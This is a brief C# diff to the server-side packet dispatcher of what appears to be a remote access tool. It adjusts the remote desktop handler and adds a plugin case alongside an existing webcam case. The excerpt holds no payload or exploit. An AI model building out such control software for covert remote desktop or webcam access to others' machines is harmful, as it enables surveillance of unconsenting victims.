@@ -86,7 +86,7 @@ namespace Server.Handle_Packet
                                     }
                                 case "remoteDesktop":
                                     {
-                                        new HandleRemoteDesktop().Capture(client, unpack_msgpack);
+                                        new HandleRemoteDesktop(client, unpack_msgpack);
                                         break;
                                     }
 
@@ -136,6 +136,12 @@ namespace Server.Handle_Packet
                                 case "webcam":
                                     {
                                         new HandleWebcam(unpack_msgpack, client);
+                                        break;
+                                    }
+
+                                case "plugin":
+                                    {
+                                        new HandlePlugin(client, unpack_msgpack.ForcePathObject("Hash").AsString);
                                         break;
                                     }
                             }
